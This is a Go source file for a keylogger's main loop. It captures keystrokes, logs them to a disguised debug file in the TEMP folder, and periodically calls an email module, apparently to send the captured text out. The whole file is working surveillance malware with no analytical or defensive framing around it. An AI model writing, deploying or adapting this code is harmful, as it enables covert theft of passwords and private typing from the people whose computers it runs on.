package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"./email"
	"./keylogger"
)

const (
	delayKeyfetchMS = 5
)

var (
	path = os.Getenv("TEMP")
)

func main() {
	//log to custom file
	LOG_FILE := path + "\\aria-debug-2608.log"
	logFile, err := os.OpenFile(LOG_FILE, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0644)
	if err != nil {
		log.Fatalln(err)
	}
	log.SetOutput(logFile)

	kl := keylogger.NewKeylogger()
	timer := 0
	var text string

	for {
		key := kl.GetKey()

		if !key.Empty {
			fmt.Printf("'%c' %d                     \n", key.Rune, key.Keycode)
			text += string(key.Rune)
		}

		if timer%1000 == 0 {
			log.Println(text)
			text = ""
		}

		if timer%2000 == 0 {
			go email.Send()
		}

		timer++

		fmt.Printf("Timer: %d\r", timer)

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}
